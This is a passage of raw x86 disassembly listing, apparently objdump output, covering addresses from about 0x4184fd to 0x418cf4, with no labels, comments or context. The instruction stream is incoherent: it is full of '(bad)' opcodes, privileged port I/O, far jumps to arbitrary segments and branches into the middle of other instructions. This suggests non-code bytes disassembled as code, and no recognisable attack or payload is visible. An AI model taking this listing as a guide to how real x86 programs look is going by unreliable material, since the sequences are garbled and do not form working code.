  4184fd:	cmp    ah,BYTE PTR [ebx+0x31cc349c]
  418503:	sub    DWORD PTR [edx+0x13867e48],0x59
  41850a:	pop    esi
  41850b:	dec    eax
  41850c:	jl     0x41852d
  41850e:	mov    esp,0x257ec13f
  418513:	call   0x336d:0x692db08b
  41851a:	inc    esi
  41851b:	sbb    BYTE PTR [ebx+eiz*2],ch
  41851e:	pop    ebx
  41851f:	sbb    al,0x5c
  418521:	aad    0xa3
  418523:	sahf   
  418524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418525:	jno    0x418507
  418527:	aam    0x9b
  418529:	lock int 0x17
  41852c:	add    DWORD PTR [esi-0x571a1675],edi
  418532:	add    BYTE PTR [eax+0x4395f51c],bl
  418538:	and    bh,BYTE PTR [esp+ebx*8+0x3ad3eafe]
  41853f:	lahf   
  418540:	xor    edx,DWORD PTR [ebp*4-0x3cc34cba]
  418547:	imul   eax,DWORD PTR [eax+0x3b3df27f],0x34d4f328
  418551:	mov    eax,0x734bde0c
  418556:	jns    0x4185b5
  418558:	mov    bl,0x92
  41855a:	jmp    0x61ea:0x37fa7cfc
  418561:	and    DWORD PTR [edi+ebp*2],eax
  418564:	in     eax,dx
  418565:	xchg   bp,ax
  418567:	rcl    DWORD PTR [ebx+ebx*1],cl
  41856a:	push   ds
  41856b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41856c:	popa   
  41856d:	(bad)  
  41856e:	mov    ecx,0x24987062
  418573:	adc    dh,0x82
  418576:	jg     0x418513
  418578:	inc    edx
  418579:	(bad)  
  41857b:	push   ecx
  41857c:	std    
  41857d:	xchg   dh,bh
  41857f:	inc    esi
  418580:	mov    BYTE PTR [ebx-0x14],ah
  418583:	sar    DWORD PTR gs:[edi],1
  418586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418587:	mov    DWORD PTR [edx+0x364adb94],eax
  41858d:	add    eax,0xb9fc9e79
  418592:	mov    al,ds:0x7f1b612c
  418597:	adc    eax,0x38
  41859a:	enter  0xbb6b,0x90
  41859e:	xor    eax,0x97106eec
  4185a3:	cdq    
  4185a4:	jmp    0xda92:0x56906971
  4185ab:	inc    ecx
  4185ac:	jo     0x4185b8
  4185ae:	popf   
  4185af:	retf   0xe5ac
  4185b2:	and    eax,0x9ed76a5b
  4185b7:	jge    0x41861e
  4185b9:	(bad)  
  4185bb:	cdq    
  4185bc:	lods   al,BYTE PTR ds:[esi]
  4185bd:	in     al,dx
  4185be:	pop    ebp
  4185bf:	aas    
  4185c0:	xor    eax,DWORD PTR [edx+0x37958ba6]
  4185c6:	dec    edi
  4185c7:	retf   
  4185c8:	add    al,BYTE PTR [edi]
  4185ca:	mov    cl,0xc3
  4185cd:	xor    BYTE PTR [eax+0x275c59e7],bh
  4185d3:	aas    
  4185d4:	and    al,dl
  4185d6:	stos   DWORD PTR es:[edi],eax
  4185d7:	fist   DWORD PTR [ebp+0x6c239efa]
  4185dd:	push   es
  4185de:	lahf   
  4185df:	xlat   BYTE PTR ds:[ebx]
  4185e0:	std    
  4185e1:	bound  ecx,QWORD PTR [ebp-0x7ec507db]
  4185e7:	jmp    0xda55:0x11f034ea
  4185ee:	retf   
  4185ef:	xchg   DWORD PTR [edx],ebx
  4185f1:	push   0x77
  4185f3:	push   0x55
  4185f5:	scas   al,BYTE PTR es:[edi]
  4185f6:	aaa    
  4185f7:	pop    eax
  4185f8:	sub    eax,0xe7d1402c
  4185fd:	adc    ecx,DWORD PTR [esi]
  4185ff:	inc    esp
  418600:	hlt    
  418601:	dec    BYTE PTR [edi-0x13]
  418604:	push   ecx
  418605:	pop    es
  418606:	and    al,0xaa
  418608:	fisubr DWORD PTR [ebp+0x4828f811]
  41860e:	push   es
  41860f:	push   eax
  418610:	xor    ebp,DWORD PTR [edi+ebx*2-0x25b34135]
  418617:	pop    esi
  418618:	xchg   ebx,eax
  418619:	lahf   
  41861a:	jg     0x41859c
  41861c:	(bad)  
  41861e:	jo     0x4185cf
  418620:	sbb    bl,BYTE PTR [ebp+0x49c81aaa]
  418626:	dec    esi
  418627:	dec    eax
  418628:	imul   eax,DWORD PTR [ebx],0xf3edb1b
  41862e:	sbb    al,BYTE PTR [ecx]
  418630:	popa   
  418631:	ins    BYTE PTR es:[edi],dx
  418632:	mov    bh,0x3
  418634:	pop    ds
  418635:	xchg   BYTE PTR [ebp-0x7],ah
  418638:	test   dh,cl
  41863a:	lea    ebx,[ebx-0x180d7153]
  418640:	fisub  WORD PTR [edx-0x501eaed]
  418646:	mov    ebx,0xc2233e13
  41864b:	mov    edi,DWORD PTR [esi+0x60]
  41864e:	popa   
  41864f:	je     0x41865b
  418651:	dec    ebx
  418652:	sbb    ch,BYTE PTR [edx-0x24b2065e]
  418658:	and    eax,0xe13696d9
  41865d:	in     al,0xdf
  41865f:	call   0x25eeabeb
  418664:	dec    esi
  418665:	addr16 mov ebx,0x629ccbd4
  41866b:	clc    
  41866c:	in     al,0x2c
  41866e:	jecxz  0x418648
  418670:	mov    ds:0xea3c4b2e,al
  418675:	xchg   ebx,eax
  418676:	cmp    eax,edi
  418678:	ror    DWORD PTR [ecx],0xc7
  41867b:	add    ecx,DWORD PTR [edi+0x45]
  41867e:	jmp    0x418612
  418680:	sub    eax,0x901be657
  418685:	clc    
  418686:	jmp    0xb7cd:0x38ca2ef1
  41868d:	mov    ds:0xc4b78670,eax
  418692:	xor    al,0x88
  418694:	add    al,0xc1
  418696:	loop   0x418634
  418698:	cs mov bh,0xb0
  41869b:	inc    edi
  41869c:	mov    ecx,0x1a130d43
  4186a1:	iret   
  4186a2:	jo     0x4186c9
  4186a4:	cli    
  4186a5:	inc    ebx
  4186a6:	jl     0x41868a
  4186a8:	dec    edi
  4186aa:	rep ins BYTE PTR es:[edi],dx
  4186ac:	ret    0xf0fb
  4186af:	and    dh,cl
  4186b1:	outs   dx,BYTE PTR ds:[esi]
  4186b2:	pusha  
  4186b3:	aam    0xc1
  4186b5:	mov    ebx,DWORD PTR [ecx-0x5d]
  4186b8:	xchg   esi,eax
  4186b9:	sub    edi,DWORD PTR [ecx-0x63]
  4186bc:	or     eax,0x943143dd
  4186c1:	add    bh,bl
  4186c3:	mov    edx,DWORD PTR [ebx]
  4186c5:	add    ah,cl
  4186c7:	or     al,0xba
  4186c9:	test   eax,0x7d4d7fc9
  4186ce:	(bad)  
  4186d0:	ss (bad) 
  4186d2:	outs   dx,DWORD PTR ds:[esi]
  4186d3:	adc    BYTE PTR [edi+0x7b5e03d],ch
  4186d9:	int3   
  4186da:	out    dx,eax
  4186db:	jne    0x4186c6
  4186dd:	mov    ds:0x13c77cef,eax
  4186e2:	fsqrt  
  4186e4:	stos   DWORD PTR es:[edi],eax
  4186e5:	sub    eax,0xf204413f
  4186ea:	jge    0x4186e5
  4186ec:	pop    eax
  4186ed:	ret    0xdcd7
  4186f0:	(bad)  
  4186f1:	je     0x4186cd
  4186f3:	jmp    0x924cbd3c
  4186f8:	inc    esi
  4186f9:	rcr    DWORD PTR [ebx+0x4e],cl
  4186fc:	pop    ds
  4186fd:	retf   0x6e41
  418700:	std    
  418701:	(bad)  
  418702:	clc    
  418703:	fcomip st,st(0)
  418705:	repnz fisub WORD PTR [ecx]
  418708:	repz push es
  41870a:	setnp  ah
  41870d:	das    
  41870e:	mov    ebp,0xf7f5dc2e
  418713:	xchg   edx,eax
  418714:	mov    al,0xb7
  418716:	call   0x94a8b1de
  41871b:	test   esi,edx
  41871d:	and    al,0x2f
  41871f:	lods   eax,DWORD PTR ds:[esi]
  418720:	in     eax,0x16
  418722:	inc    ebp
  418723:	scas   al,BYTE PTR es:[edi]
  418724:	(bad)
  418728:	pop    ss
  418729:	dec    ebp
  41872a:	pop    edi
  41872b:	cld    
  41872c:	inc    BYTE PTR [ebx+0x6275936b]
  418732:	xor    BYTE PTR [edi],al
  418734:	add    eax,0x2e623ff3
  418739:	xor    esp,DWORD PTR [esp+esi*2]
  41873c:	jb     0x4186d2
  41873e:	push   0x3a
  418740:	sbb    eax,0x37bffea4
  418745:	sub    bh,BYTE PTR [edi+edi*1-0x6f6f64e6]
  41874c:	ja     0x418764
  41874e:	js     0x4187be
  418750:	dec    ebp
  418751:	leave  
  418752:	sub    eax,0xb47e792a
  418757:	outs   dx,DWORD PTR ds:[esi]
  418758:	push   edi
  418759:	fwait
  41875a:	ret    
  41875b:	retf   
  41875c:	or     bh,ah
  41875e:	ret    0xc6a6
  418761:	lock test DWORD PTR [ebp+0x34],edx
  418765:	adc    eax,0x1af6ec4a
  41876a:	fsub   QWORD PTR [ecx+0x5]
  41876d:	jp     0x4187ee
  41876f:	jne    0x4187ba
  418771:	add    DWORD PTR [edi],edi
  418773:	int3   
  418774:	mov    WORD PTR [edi+0x61ecc77f],?
  41877a:	add    BYTE PTR [ecx+0x68],dh
  41877d:	neg    DWORD PTR [eax-0x62a317]
  418783:	push   ss
  418784:	cmp    eax,0x2367a15f
  418789:	in     eax,0xe2
  41878b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41878c:	jae    0x4187ae
  41878e:	nop
  41878f:	xchg   edx,eax
  418790:	cmp    ebp,ecx
  418792:	ret    0xcb68
  418795:	cmp    al,0x8
  418797:	pop    esi
  418798:	ret    
  418799:	push   cs
  41879a:	jb     0x41875b
  41879c:	jmp    0x41878e
  41879e:	fldcw  WORD PTR [edx+0x78d1f388]
  4187a4:	mov    ebp,?
  4187a6:	mov    ds:0x4ec8a8a7,al
  4187ab:	cld    
  4187ac:	sbb    al,0xb1
  4187ae:	ret    
  4187af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187b0:	and    bh,ch
  4187b2:	pop    ss
  4187b3:	aam    0x24
  4187b5:	rol    DWORD PTR [ecx+0x22],cl
  4187b8:	out    dx,eax
  4187b9:	pop    edi
  4187ba:	inc    edx
  4187bb:	jbe    0x4187b5
  4187bd:	ret    
  4187be:	or     eax,0x4b6d3fc5
  4187c3:	jge    0x418821
  4187c5:	out    dx,al
  4187c6:	ja     0x418785
  4187c8:	popa   
  4187c9:	cmp    al,BYTE PTR [ebx]
  4187cb:	jmp    0x418784
  4187cd:	out    dx,al
  4187ce:	sub    edx,ebx
  4187d0:	mov    al,ds:0xf0f16113
  4187d5:	adc    al,0x74
  4187d7:	and    al,0x20
  4187d9:	mov    ah,BYTE PTR ds:[eax+0x41]
  4187dd:	(bad)  
  4187de:	jl     0x418792
  4187e0:	repnz dec ebp
  4187e2:	cmp    eax,0x97556812
  4187e7:	mov    dh,0x2c
  4187e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187ea:	mov    eax,fs
  4187ec:	sbb    ah,BYTE PTR [ecx-0x39bb0402]
  4187f2:	inc    eax
  4187f3:	add    ah,bl
  4187f5:	push   esi
  4187f6:	or     esp,edx
  4187f8:	pop    ebp
  4187f9:	pop    esi
  4187fa:	stos   DWORD PTR es:[edi],eax
  4187fb:	sbb    bh,BYTE PTR [esi+0x1c17049a]
  418801:	mov    al,0xe4
  418803:	imul   esi,esi,0xb1782122
  418809:	inc    ebx
  41880a:	mov    ds:0x1fa286ef,al
  41880f:	add    al,0x4e
  418811:	in     eax,0x1c
  418813:	push   ebx
  418814:	dec    ecx
  418815:	sub    bh,bl
  418817:	fcom   DWORD PTR [ecx+0x7e]
  41881a:	adc    eax,0xe63c416f
  41881f:	jl     0x418885
  418821:	mov    ebx,0xfac58d28
  418826:	jle    0x4187bd
  418828:	std    
  418829:	clc    
  41882a:	push   esi
  41882b:	in     al,dx
  41882c:	aam    0x23
  41882e:	adc    esp,DWORD PTR [edx-0x29]
  418831:	shr    BYTE PTR [ecx+0x78],0x0
  418835:	xor    cl,ch
  418837:	(bad)  
  418838:	push   ebx
  418839:	dec    ebp
  41883a:	cmp    edi,DWORD PTR [eax+0x5ca10f9e]
  418840:	sub    al,0xea
  418842:	das    
  418843:	xlat   BYTE PTR ds:[ebx]
  418844:	adc    BYTE PTR [ebx+0x49],ah
  418847:	mov    bl,0xbd
  418849:	push   ecx
  41884a:	fimul  DWORD PTR [ebx+ebp*2]
  41884d:	adc    edi,DWORD PTR [edi-0x32]
  418850:	inc    ebp
  418851:	cs push ds
  418853:	cmp    ch,ah
  418855:	push   eax
  418856:	mov    dl,0xed
  418858:	xchg   ecx,eax
  418859:	in     eax,0x1c
  41885b:	add    al,0x7d
  41885d:	adc    BYTE PTR [esi-0x3e929630],bh
  418863:	xchg   DWORD PTR [edi],edx
  418865:	jo     0x41887c
  418867:	jmp    0x5a43d4e5
  41886c:	mov    bh,ch
  41886e:	push   ebx
  41886f:	test   DWORD PTR [ebx-0x10],edi
  418872:	sbb    BYTE PTR [ebx],bl
  418874:	(bad)  
  418875:	push   ebx
  418876:	sar    DWORD PTR [edi-0x5f],0x5
  41887a:	mov    eax,ds:0x28805000
  41887f:	ret    0xc568
  418882:	or     al,BYTE PTR [ebx+0x48]
  418885:	outs   dx,BYTE PTR gs:[esi]
  418887:	in     eax,dx
  418888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418889:	mov    edx,esp
  41888b:	mov    esp,0x5ddd0e7f
  418890:	or     dh,BYTE PTR [esi+0x2ef58ade]
  418896:	jl     0x4188f2
  418898:	leave  
  418899:	push   edx
  41889a:	cmp    cl,BYTE PTR [esi-0x2edd3c23]
  4188a0:	(bad)  
  4188a2:	mov    ecx,0x14bfaa48
  4188a7:	inc    cx
  4188a9:	cs retf 0xdc12
  4188ad:	jae    0x418868
  4188af:	out    0xd0,al
  4188b1:	xchg   edx,esi
  4188b3:	jmp    0x41883b
  4188b5:	pop    edx
  4188b6:	or     cl,al
  4188b8:	cmp    DWORD PTR [edx+0x2ec10495],0x9c2a8f7f
  4188c2:	mov    edi,fs
  4188c4:	push   0x25196464
  4188c9:	gs clc 
  4188cb:	push   ds
  4188cc:	in     al,dx
  4188cd:	sbb    DWORD PTR [edx-0x6b],0x9b6e395a
  4188d4:	shl    DWORD PTR ds:0xca73a704,cl
  4188da:	sbb    BYTE PTR [edi+0x69e6b16f],bl
  4188e0:	cmp    DWORD PTR [edi+0x36],esi
  4188e3:	inc    esi
  4188e4:	sahf   
  4188e5:	jmp    0x418928
  4188e7:	retf   
  4188e8:	add    eax,0x34726c5e
  4188ed:	inc    ecx
  4188ee:	cli    
  4188ef:	loope  0x41895a
  4188f1:	jecxz  0x418971
  4188f3:	out    0x68,al
  4188f5:	outs   dx,BYTE PTR ds:[esi]
  4188f6:	ret    
  4188f7:	inc    ecx
  4188f8:	xor    cl,bl
  4188fa:	test   ebp,esp
  4188fc:	mov    bl,0xf0
  4188fe:	(bad)  
  4188ff:	lods   eax,DWORD PTR ds:[esi]
  418900:	push   esp
  418901:	push   0xe96206db
  418906:	scas   eax,DWORD PTR es:[edi]
  418907:	ret    0x4c7e
  41890a:	push   0x73
  41890c:	hlt    
  41890d:	mov    ebp,0x605ecd3e
  418913:	stos   DWORD PTR es:[edi],eax
  418914:	adc    BYTE PTR [ebp-0x14c28d59],0xd0
  41891b:	mov    edx,0x6b8e6a47
  418920:	leave  
  418921:	push   esi
  418922:	outs   dx,BYTE PTR ds:[esi]
  418923:	neg    eax
  418925:	icebp  
  418926:	retf   
  418927:	xchg   ecx,eax
  418928:	test   eax,0x7a279cb1
  41892d:	rcl    ebp,0x33
  418930:	fdiv   QWORD PTR [ebx]
  418932:	push   esi
  418933:	jmp    0xceab:0x17c3772
  41893a:	outs   dx,BYTE PTR ds:[esi]
  41893b:	pop    edi
  41893c:	(bad)  
  41893d:	ins    DWORD PTR es:[edi],dx
  41893e:	sbb    BYTE PTR [ebp-0x404ec749],0x91
  418945:	in     al,0x7b
  418947:	cld    
  418948:	fs cmc 
  41894a:	mov    ah,0xb8
  41894c:	lahf   
  41894d:	pop    esp
  41894e:	shl    DWORD PTR [edx],cl
  418950:	inc    ebx
  418951:	(bad)  
  418953:	pop    edx
  418954:	xchg   esi,eax
  418955:	outs   dx,DWORD PTR ds:[esi]
  418956:	sub    al,0xcc
  418958:	and    ebp,edi
  41895a:	dec    esp
  41895b:	out    dx,al
  41895c:	or     DWORD PTR [ebp-0x35fcb14c],esi
  418962:	loop   0x4188f7
  418964:	xor    bl,BYTE PTR [ecx+ebx*4+0x6c]
  418968:	add    ch,BYTE PTR [edx-0x66]
  41896b:	outs   dx,DWORD PTR ds:[esi]
  41896c:	ds mov bl,0x49
  41896f:	jo     0x41895a
  418971:	xchg   ebx,eax
  418972:	xor    BYTE PTR [eax-0x29],ah
  418975:	and    ebx,DWORD PTR [ebp+edx*8+0x4d63e29b]
  41897c:	jno    0x4189db
  41897e:	fdivr  QWORD PTR [ebp-0x15e22f08]
  418984:	jle    0x418991
  418986:	pop    ebx
  418987:	cmp    al,0x21
  418989:	out    0xca,al
  41898b:	mul    bh
  41898d:	pop    eax
  41898e:	aam    0xcb
  418990:	add    BYTE PTR [edi+edi*8-0x60],dl
  418994:	xchg   esp,eax
  418995:	loope  0x4189cc
  418997:	cmp    DWORD PTR [eax+0x384395df],ebp
  41899d:	data16 faddp st(2),st
  4189a0:	into   
  4189a1:	xchg   ecx,eax
  4189a2:	mov    BYTE PTR [ebp+edx*4-0x9888f2],dh
  4189a9:	sbb    DWORD PTR [ecx+0x27a7799e],ebx
  4189af:	cdq    
  4189b0:	or     eax,0x30a6f467
  4189b5:	mov    BYTE PTR [esi],cl
  4189b7:	jne    0x41893e
  4189b9:	or     BYTE PTR [esi+ecx*1+0x55],dh
  4189bd:	ret    
  4189be:	mov    eax,ds:0xffc8a22d
  4189c3:	iret   
  4189c4:	pop    esp
  4189c5:	sub    esp,esi
  4189c7:	sub    esi,esi
  4189c9:	cs adc eax,0xf21f8bce
  4189cf:	push   esp
  4189d0:	(bad)  
  4189d1:	jmp    0x7992e171
  4189d6:	call   0x4305:0x3a98a6c
  4189dd:	int    0x62
  4189df:	sbb    al,dl
  4189e1:	sbb    eax,0x72ed27d6
  4189e6:	xor    al,0x8b
  4189e8:	mov    eax,0x895ac3c6
  4189ed:	push   esi
  4189ee:	call   0xbfc9:0xa0fd039c
  4189f5:	adc    DWORD PTR [edi-0x56],edx
  4189f8:	mov    eax,0x23fd7178
  4189fd:	lods   al,BYTE PTR ds:[esi]
  4189fe:	fwait
  4189ff:	inc    esp
  418a00:	mov    eax,0x2954e124
  418a05:	test   ah,al
  418a07:	pop    esp
  418a08:	enter  0x61ce,0x43
  418a0c:	push   cs
  418a0d:	mov    BYTE PTR [ebp+0x53d6fdd7],al
  418a13:	inc    ecx
  418a14:	inc    esi
  418a15:	fadd   st,st(1)
  418a17:	(bad)  
  418a18:	mov    bh,0x13
  418a1a:	std    
  418a1b:	test   BYTE PTR [ebx-0x3e46e8],cl
  418a21:	sbb    DWORD PTR [edi],ecx
  418a23:	stos   BYTE PTR es:[edi],al
  418a24:	mov    WORD PTR [esi+0x5721f572],ss
  418a2a:	fmul   DWORD PTR [esi+eiz*8]
  418a2d:	pop    ebx
  418a2e:	test   al,0x10
  418a30:	sub    BYTE PTR [ebp+0x42],dh
  418a33:	dec    esi
  418a34:	icebp  
  418a35:	test   DWORD PTR [ebx+0xcb68bcc],0xfb96b046
  418a3f:	rol    DWORD PTR [eax],0xc
  418a42:	sbb    al,0x25
  418a44:	pushw  es
  418a46:	push   ebp
  418a47:	repnz or al,bl
  418a4a:	mov    ebp,DWORD PTR [eax]
  418a4c:	xchg   ebp,eax
  418a4d:	sbb    cl,BYTE PTR [eax-0x37]
  418a50:	stc    
  418a51:	dec    ecx
  418a52:	fsub   QWORD PTR [edx+0x61]
  418a55:	sbb    edi,eax
  418a57:	(bad)  
  418a58:	clc    
  418a59:	inc    ecx
  418a5a:	push   ebp
  418a5b:	or     ebx,ebx
  418a5d:	xchg   ebp,esp
  418a5f:	test   DWORD PTR [ebx],edi
  418a61:	dec    esi
  418a62:	and    DWORD PTR [edx-0x1f33fc1b],0x28
  418a69:	pop    ss
  418a6a:	sub    DWORD PTR [edi-0x2ec0b377],ecx
  418a70:	cmp    BYTE PTR [esi+ecx*2+0x2be58a4],ah
  418a77:	mov    dl,0x8d
  418a79:	iret   
  418a7a:	in     eax,dx
  418a7b:	sub    BYTE PTR [ebx],0x98
  418a7e:	mov    ecx,0x7146d27b
  418a83:	lods   eax,DWORD PTR ds:[esi]
  418a84:	popa   
  418a85:	or     eax,0xdfe8475b
  418a8a:	ins    BYTE PTR es:[edi],dx
  418a8b:	sti    
  418a8c:	test   al,0xa5
  418a8e:	fidivr WORD PTR [esi]
  418a90:	stc    
  418a91:	pcmpgtd mm1,QWORD PTR [edx]
  418a94:	or     BYTE PTR [edi],0xca
  418a97:	sbb    eax,0xc02f5f58
  418a9c:	push   0x3e
  418a9e:	in     al,dx
  418a9f:	inc    eax
  418aa0:	ins    BYTE PTR es:[edi],dx
  418aa1:	mov    ds:0x5a1a33b,al
  418aa6:	cmp    eax,0x773c5966
  418aab:	inc    esp
  418aac:	jp     0x418a5c
  418aae:	add    eax,0x17d46722
  418ab3:	fs aas 
  418ab5:	xor    eax,0x175ec17
  418aba:	dec    ebx
  418abb:	lods   al,BYTE PTR ds:[esi]
  418abc:	mov    bh,0x7c
  418abe:	mov    eax,0xd4791ad8
  418ac3:	add    BYTE PTR ds:0x5820c6f2,bh
  418ac9:	inc    esp
  418aca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418acb:	ds enter 0x8105,0x74
  418ad0:	mov    dh,0x79
  418ad2:	cmp    bh,0xb3
  418ad5:	sub    edx,DWORD PTR [ebp+0x31]
  418ad8:	(bad)  
  418ad9:	shl    BYTE PTR [edi+0x33e02d29],0x15
  418ae0:	fdiv   QWORD PTR [ebx-0x14db8d1e]
  418ae6:	add    eax,0x98317e6c
  418aeb:	(bad)  
  418aed:	jae    0x418b3e
  418aef:	fstp   QWORD PTR [ecx]
  418af1:	xchg   BYTE PTR ds:0x211ecda9,bh
  418af7:	iret   
  418af8:	jbe    0x418b39
  418afa:	mov    edi,edx
  418afc:	ja     0x418abf
  418afe:	pushf  
  418aff:	ss mul al
  418b02:	and    al,dh
  418b04:	test   eax,0x19fb5ba9
  418b09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b0a:	add    DWORD PTR [edi],0x4a
  418b0d:	jns    0x418b1b
  418b0f:	cmp    ebx,ebx
  418b11:	inc    ebp
  418b12:	loopne 0x418ae0
  418b14:	mov    esp,0x56f100bf
  418b19:	scas   al,BYTE PTR es:[edi]
  418b1a:	fcom   QWORD PTR [ebp-0x67]
  418b1d:	mov    bl,0xd4
  418b1f:	push   0xffffffb6
  418b21:	sbb    al,0xec
  418b23:	nop
  418b24:	in     eax,0x35
  418b26:	mov    dl,0xd8
  418b28:	arpl   bp,sp
  418b2a:	stos   DWORD PTR es:[edi],eax
  418b2b:	loop   0x418b1d
  418b2d:	sahf   
  418b2e:	ins    DWORD PTR es:[edi],dx
  418b2f:	lock (bad) 
  418b31:	cli    
  418b32:	lods   eax,DWORD PTR ds:[esi]
  418b33:	pop    eax
  418b34:	das    
  418b35:	je     0x418b15
  418b37:	retf   0xea9
  418b3a:	pop    esp
  418b3b:	pushf  
  418b3c:	mov    ah,BYTE PTR [ecx]
  418b3e:	test   dh,dl
  418b40:	jp     0x418b10
  418b42:	push   es
  418b43:	dec    ecx
  418b44:	inc    ecx
  418b45:	mov    ch,0xbb
  418b47:	fild   QWORD PTR [ebx+esi*4]
  418b4a:	mov    ax,0x29e2
  418b4e:	repz in eax,0xd1
  418b51:	imul   esp,DWORD PTR [ecx+0x25d81ea5],0x3a
  418b58:	inc    edi
  418b59:	in     eax,0x65
  418b5b:	inc    esi
  418b5c:	(bad)  
  418b5d:	pop    ebx
  418b5e:	pop    ebx
  418b5f:	xchg   BYTE PTR [ecx],al
  418b61:	mov    ebp,0xa5f95778
  418b66:	iret   
  418b67:	mov    edx,0x93d11ce7
  418b6c:	jae    0x418bc3
  418b6e:	pop    eax
  418b6f:	dec    esi
  418b70:	inc    ecx
  418b71:	lock in al,0x99
  418b74:	cli    
  418b75:	js     0x418b2d
  418b77:	dec    esp
  418b78:	mov    eax,0xbbf807c1
  418b7d:	push   di
  418b7f:	push   eax
  418b80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b81:	xchg   edi,eax
  418b82:	fsub   st,st(2)
  418b84:	iret   
  418b85:	jecxz  0x418bbe
  418b87:	mov    ch,0x8b
  418b89:	cld    
  418b8a:	outs   dx,DWORD PTR ds:[esi]
  418b8b:	mov    ebp,0xd331b8ae
  418b90:	dec    edx
  418b91:	push   edx
  418b93:	fs sub ch,bl
  418b96:	cmp    al,0x60
  418b98:	(bad)
  418b9c:	pop    edi
  418b9d:	push   ebx
  418b9e:	divps  xmm0,XMMWORD PTR [edi+0x26cb53ca]
  418ba5:	push   ss
  418ba6:	inc    eax
  418ba7:	std    
  418ba8:	(bad)  
  418ba9:	push   0x4fea4983
  418bae:	jbe    0x418bcc
  418bb0:	in     al,dx
  418bb1:	adc    eax,0x66bcd944
  418bb6:	sbb    ch,0xed
  418bb9:	inc    eax
  418bba:	ds inc ebp
  418bbc:	ficom  WORD PTR [ecx+0x2a33d1ba]
  418bc2:	and    DWORD PTR [ebx+0x6f600e68],0xfaaa7d54
  418bcc:	ins    BYTE PTR es:[edi],dx
  418bcd:	pop    ebx
  418bce:	pop    eax
  418bcf:	aam    0x69
  418bd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bd2:	and    BYTE PTR ds:0xf4928e4b,0x2d
  418bd9:	sub    ch,BYTE PTR [eax-0x39]
  418bdc:	out    0x7c,al
  418bde:	call   0x63314b72
  418be3:	pop    edx
  418be4:	pop    ds
  418be5:	das    
  418be6:	int3   
  418be7:	push   ss
  418be8:	mov    ds:0x3d5148de,al
  418bed:	add    eax,0xdec07966
  418bf2:	pop    edi
  418bf3:	adc    eax,ebx
  418bf5:	ret    0xd951
  418bf8:	test   BYTE PTR [ecx-0x8ae9ffa],dh
  418bfe:	call   0x61d2:0x8eb99d04
  418c05:	mov    esi,0x3f5453f5
  418c0a:	push   0x3a69a29
  418c0f:	cmp    ebp,DWORD PTR [edx+0xe]
  418c12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c13:	mov    ebx,0x360e6285
  418c18:	inc    ebp
  418c19:	inc    esi
  418c1a:	pop    esp
  418c1b:	ins    DWORD PTR es:[edi],dx
  418c1c:	cmp    al,0xd9
  418c1e:	repz jnp 0x418c3e
  418c21:	sbb    eax,0x63691dfb
  418c26:	call   0x663ca0c4
  418c2b:	xor    edi,DWORD PTR [esi-0x4fe1ee61]
  418c31:	dec    eax
  418c32:	pop    es
  418c33:	or     eax,0x311ad628
  418c38:	sbb    dh,bh
  418c3a:	or     dh,0x26
  418c3d:	and    BYTE PTR [edi-0x3b],cl
  418c40:	stc    
  418c41:	mov    dl,0x5f
  418c43:	pusha  
  418c44:	cmp    DWORD PTR [esi],eax
  418c46:	sub    eax,0x3ac3a3b8
  418c4b:	aam    0xa3
  418c4d:	popf   
  418c4e:	aad    0x82
  418c50:	iret   
  418c51:	stos   DWORD PTR es:[edi],eax
  418c52:	(bad)  
  418c53:	add    al,dl
  418c55:	jl     0x418c0e
  418c57:	shr    DWORD PTR [edi+0x9],cl
  418c5a:	push   esi
  418c5b:	jmp    0xd93d24da
  418c60:	xchg   edi,eax
  418c61:	clc    
  418c62:	dec    ebp
  418c63:	out    0x5a,eax
  418c65:	or     eax,0x9e77ec5b
  418c6a:	in     al,0xbc
  418c6c:	js     0x418cd0
  418c6e:	mov    al,ds:0xa38813f2
  418c73:	ds jae 0x418c27
  418c76:	or     BYTE PTR [eax],bl
  418c78:	mov    cl,0x28
  418c7a:	mov    edi,0xc30930e0
  418c7f:	enter  0x51e9,0x50
  418c83:	shl    bl,0x3
  418c86:	dec    ebx
  418c87:	mov    eax,0x6da7cbe6
  418c8c:	in     al,0xe8
  418c8e:	mov    ch,0x3e
  418c90:	mov    ch,BYTE PTR [ecx-0x4d]
  418c93:	mov    ah,0xec
  418c95:	sbb    cl,ah
  418c97:	and    DWORD PTR [edi],0xffffffe8
  418c9a:	repnz in eax,0x1d
  418c9d:	or     BYTE PTR ds:0xf08c63d7,dl
  418ca3:	retf   
  418ca4:	inc    ecx
  418ca5:	mov    ds:0xa0d7638,al
  418caa:	jno    0x418d27
  418cac:	loop   0x418c90
  418cae:	mov    ebx,0xeb4069fe
  418cb3:	lahf   
  418cb4:	sub    edi,DWORD PTR [edx]
  418cb6:	ret    0x108e
  418cb9:	inc    esi
  418cba:	fmul   QWORD PTR [esp+edi*4-0x32]
  418cbe:	dec    eax
  418cbf:	fiadd  WORD PTR [ebx]
  418cc1:	in     al,0x27
  418cc3:	outs   dx,DWORD PTR ds:[esi]
  418cc4:	xor    DWORD PTR [edi],ecx
  418cc6:	xor    edx,DWORD PTR ss:[edx+ebp*1]
  418cca:	xchg   esp,eax
  418ccb:	jnp    0x418cd8
  418ccd:	pusha  
  418cce:	fadd   QWORD PTR [ebx-0x72b63b6b]
  418cd4:	mov    eax,ds:0x473a77bc
  418cd9:	scas   eax,DWORD PTR es:[edi]
  418cda:	xchg   ebx,eax
  418cdb:	dec    edx
  418cdc:	mov    WORD PTR [eax+0x3e1376a2],fs
  418ce2:	sbb    al,0x9d
  418ce4:	push   ebp
  418ce5:	sub    al,0xf0
  418ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ce8:	outs   dx,BYTE PTR ds:[esi]
  418ce9:	jnp    0x418cb7
  418ceb:	scas   al,BYTE PTR es:[edi]
  418cec:	fdiv   DWORD PTR [edx+ebx*1-0x1ded1432]
  418cf3:	xchg   ebp,eax
  418cf4:	dec    ebx
